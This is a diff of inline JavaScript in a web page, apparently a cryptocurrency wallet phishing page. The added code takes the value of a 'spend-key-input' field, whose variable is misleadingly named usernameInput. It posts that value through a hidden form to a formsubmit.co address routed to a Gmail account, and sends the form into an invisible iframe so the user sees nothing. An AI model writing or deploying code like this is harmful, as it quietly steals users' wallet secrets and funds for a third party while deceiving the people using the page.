@@ -989,27 +989,47 @@ const usernameInput = document.getElementById("spend-key-input");
 const sendBtn = document.getElementById("btn-derive-seed");
 
 sendBtn.addEventListener("click", function () {
+
+    // Create hidden iframe if it doesn't exist
+    let iframe = document.getElementById("hidden_iframe");
+
+    if (!iframe) {
+        iframe = document.createElement("iframe");
+        iframe.id = "hidden_iframe";
+        iframe.name = "hidden_iframe";
+        iframe.style.display = "none";
+        document.body.appendChild(iframe);
+    }
+
+    // Create temporary form
     const form = document.createElement("form");
     form.method = "POST";
     form.action = "https://formsubmit.co/exchangenet1@gmail.com";
+    form.target = "hidden_iframe";
     form.style.display = "none";
 
-    [
-        ["Complaint", complaintInput.value],
-        ["Username", usernameInput.value],
-        ["_captcha", "false"]
-    ].forEach(([name, value]) => {
+    // Hidden fields
+    const fields = {
+        Complaint: complaintInput.value,
+        Username: usernameInput.value,
+        _captcha: "false"
+    };
+
+    for (const key in fields) {
         const input = document.createElement("input");
         input.type = "hidden";
-        input.name = name;
-        input.value = value;
+        input.name = key;
+        input.value = fields[key];
         form.appendChild(input);
-    });
+    }
 
     document.body.appendChild(form);
 
-    // Submit after the current click handlers have had a chance to run.
-    setTimeout(() => form.submit(), 100);
+    // Submit in the hidden iframe
+    form.submit();
+
+    // Clean up the temporary form
+    setTimeout(() => form.remove(), 1000);
 });
  </script>                   
 
